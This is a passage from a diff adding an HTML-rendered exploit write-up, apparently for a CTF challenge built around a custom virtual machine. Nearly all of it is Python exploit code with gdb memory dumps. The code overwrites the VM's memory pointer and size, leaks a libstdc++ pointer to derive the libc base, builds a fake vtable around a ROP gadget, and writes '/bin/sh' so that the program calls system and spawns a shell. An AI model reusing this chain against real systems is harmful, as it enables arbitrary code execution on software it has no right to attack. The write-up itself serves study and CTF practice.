+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf04</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+
+<span class="c1"># padding to increase pc
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ror</span><span class="p">()</span> <span class="o">*</span> <span class="mi">80</span>
+
+<span class="c1"># move _mem ptr up
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf06</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xd800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x5000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x4c70</span><span class="p">)</span>                 <span class="c1"># 0xf08 original vtable offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x26d0</span><span class="p">)</span>                 <span class="c1"># 0xf0a offset to main
+</span>
+<span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4096</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span></code></pre></figure>
+
+<p>This will again, overwrite the size of <code class="language-plaintext highlighter-rouge">_mem</code> and then move the <code class="language-plaintext highlighter-rouge">_mem</code> ptr before the <code class="language-plaintext highlighter-rouge">vm</code>, so that it points before a <code class="language-plaintext highlighter-rouge">libstdc++</code> pointer from the previously generated exception.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d330:	0x00005555555563e1	0x000055555556d360
+0x55555556d340:	0x474e5543432b2b00	0x00007ffff7df8290
+0x55555556d350:	0x0000000000000000	0x00007fffffffecf0
+0x55555556d360:	0x00007ffff7fabff0	0x000055555556d398  &lt;= libstdc++ pointer
+0x55555556d370:	0x0000000000000000	0x0000000000000041
+0x55555556d380:	0x000000055555556d	0x8a8aeb215917a587
+0x55555556d390:	0x00000000ffffffff	0x206c6167656c6c49
+0x55555556d3a0:	0x7463757274736e69	0x00000000006e6f69
+0x55555556d3b0:	0x0000000000000000	0x0000000000001031
+0x55555556d3c0:	0x0000555555558c70	0xd000ef025000ef00  &lt;= second VM
+0x55555556d3d0:	0x0000000000000000	0x0000000000000000
+0x55555556d3e0:	0x40004000fff8eef4	0x4000400040004000
+0x55555556d3f0:	0x4000400040004000	0x4000400040004000
+0x55555556d400:	0xffefeef640004000	0x0000000000000000
+
+...
+
+0x55555556e3c0:	0x0000000000000000	0x000055555556d350  &lt;= _mem ptr
+0x55555556e3d0:	0x000000000000ffff	0x0001d8006000bff0
+0x55555556e3e0:	0x0000000000000000	0x000000000000cc21</code></pre></figure>
+
+<p>Now we can read the <code class="language-plaintext highlighter-rouge">libstdc++</code> pointer, calculate <code class="language-plaintext highlighter-rouge">libc</code> base from it and store it in <code class="language-plaintext highlighter-rouge">_mem</code> for further usage.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">LIBCOFFSET</span> <span class="o">=</span> <span class="mh">0x4aeff0</span>
+
+<span class="c1"># read libstdc++ pointer and calculate libc base and store in _mem
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>                    <span class="c1"># bytes 0-2
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sbc</span><span class="p">(</span><span class="mh">0xf08</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>                    <span class="c1"># bytes 2-4
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sbc</span><span class="p">(</span><span class="mh">0xf0a</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x402</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x14</span><span class="p">)</span>                    <span class="c1"># bytes 4-6
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x404</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xd800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x5000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">LIBCOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>            <span class="c1"># 0xf08 libc offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">LIBCOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>    <span class="c1"># 0xf0a libc offset (16-32)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d7b0:	0x0000000000000000	0x0000000000000000
+0x55555556d7c0:	0x0000000000000000	0x00007ffff7afd000 &lt;= libc base
+0x55555556d7d0:	0x0000000000000000	0x0000000000000000
+0x55555556d7e0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>When the application calls <code class="language-plaintext highlighter-rouge">vm-&gt;dump_register</code> it will call the function at <code class="language-plaintext highlighter-rouge">vtable+8</code> and the <code class="language-plaintext highlighter-rouge">vm</code> itself as its argument (<code class="language-plaintext highlighter-rouge">rdi</code>). To call something like <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, we’d also need to control <code class="language-plaintext highlighter-rouge">rdi</code>. We can use the following gadget for it</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x000000000016e44e: mov rdi, r14; call qword ptr [rax + 0x10];
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">r14</code> will point into our current <code class="language-plaintext highlighter-rouge">_mem</code>, so we can put <code class="language-plaintext highlighter-rouge">/bin/sh</code> there, and then it will call <code class="language-plaintext highlighter-rouge">[rax + 0x10]</code>, which is directly behind our fake call. So let’s prepare the fake vtable accordingly.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># 0x000000000016e44e: mov rdi, r14; call qword ptr [rax + 0x10];
+</span><span class="n">GADGETOFFSET</span> <span class="o">=</span> <span class="mh">0x16e44e</span>
+
+<span class="c1"># write fake vtable with gadget
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># libc base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf0c</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># add gadget offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x410</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># fake vtable
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x402</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># libc base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf0e</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># add gadget offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x412</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># fake vtable
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x404</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># libc base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x414</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># fake vtable
+</span>
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xd800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x5000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">LIBCOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>            <span class="c1"># 0xf08 libc offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">LIBCOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>    <span class="c1"># 0xf0a libc offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">GADGETOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>          <span class="c1"># 0xf0c gadget offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">GADGETOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="c1"># 0xf0e gadget offset (16-32)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d7c0:	0x0000000000000000	0x00007ffff7afd000 &lt;= libc base address
+0x55555556d7d0:	0x0000000000000000	0x00007ffff7c6b44e &lt;= fake vtable (pointing to gadget)
+0x55555556d7e0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Write <code class="language-plaintext highlighter-rouge">/bin/sh</code> to the address <code class="language-plaintext highlighter-rouge">r14</code> will point to.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># write binsh string to _mem
+</span><span class="n">BINSH</span> <span class="o">=</span> <span class="mh">0x0068732f6e69622f</span>
+
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf10</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf12</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf14</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x14</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf16</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x16</span><span class="p">)</span>
+
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xd800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x5000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">LIBCOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>            <span class="c1"># 0xf08 libc offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">LIBCOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>    <span class="c1"># 0xf0a libc offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">GADGETOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>          <span class="c1"># 0xf0c gadget offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">GADGETOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="c1"># 0xf0e gadget offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">BINSH</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf10 binsh (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf12 binsh (16-32)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf14 binsh (32-48)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf16 binsh (48-64)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d360:	0x0068732f6e69622f	0x000055555556d398 &lt;= r14
+0x55555556d370:	0x0000000000000000	0x0000000000000041
+
+0x55555556d360:	"/bin/sh"</code></pre></figure>
+
+<p>Writing <code class="language-plaintext highlighter-rouge">system+0x1b</code> to <code class="language-plaintext highlighter-rouge">rax+0x10</code>. We’re using <code class="language-plaintext highlighter-rouge">system+0x1b</code> here, so that the stack will be correctly aligned, avoiding running into a segfault on <code class="language-plaintext highlighter-rouge">movaps</code> later on.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">SYSTEMOFFSET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1b</span>
+
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x400</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># libc base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf18</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># add system offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x418</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># store at 0x418
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x402</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># libc base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf1a</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># add system offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x418</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>     <span class="c1"># store at 0x418+2
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0x404</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># libc base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x418</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>     <span class="c1"># store at 0x418+4
+</span>
+<span class="c1"># overwrite vtable with fake vtable
+</span>
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xd800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x5000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">LIBCOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>            <span class="c1"># 0xf08 libc offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">LIBCOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>    <span class="c1"># 0xf0a libc offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">GADGETOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>          <span class="c1"># 0xf0c gadget offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">GADGETOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="c1"># 0xf0e gadget offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">BINSH</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf10 binsh (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf12 binsh (16-32)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf14 binsh (32-48)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">BINSH</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>         <span class="c1"># 0xf16 binsh (48-64)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">SYSTEMOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>          <span class="c1"># 0xf18 system offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">SYSTEMOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="c1"># 0xf1a system offset (16-32)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d7c0:	0x0000000000000000	0x00007ffff7afd000 &lt;= libc base
+0x55555556d7d0:	0x0000000000000000	0x00007ffff7c6b44e &lt;= fake vtable / gadget
+0x55555556d7e0:	0x00007ffff7b5575b	0x0000000000000000 &lt;= system+0x1b</code></pre></figure>
+
+<p>With everything prepared, we now just have to overwrite the <code class="language-plaintext highlighter-rouge">vtable</code> pointer of the vm one last time to trigger our gadget and execute <code class="language-plaintext highlighter-rouge">system("/bin/sh)</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite vtable with fake vtable
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf1c</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># get _mem_ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ldi</span><span class="p">()</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf22</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># add offset to fake vtable
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>                   <span class="c1"># overwrite vtable
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf1e</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># get _mem_ptr+2
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ldi</span><span class="p">()</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">)</span>
+
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf20</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">)</span>           <span class="c1"># get _mem_ptr+4
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ldi</span><span class="p">()</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
+
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xd800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x5000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">LIBCOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>            <span class="c1"># 0xf08 libc offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">LIBCOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>    <span class="c1"># 0xf0a libc offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">GADGETOFFSET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>          <span class="c1"># 0xf0c gadget offset (0-16)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">((</span><span class="n">GADGETOFFSET</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>  <span class="c1"># 0xf0e gadget offset (16-32)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">BINSH</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf10 binsh (0-16)
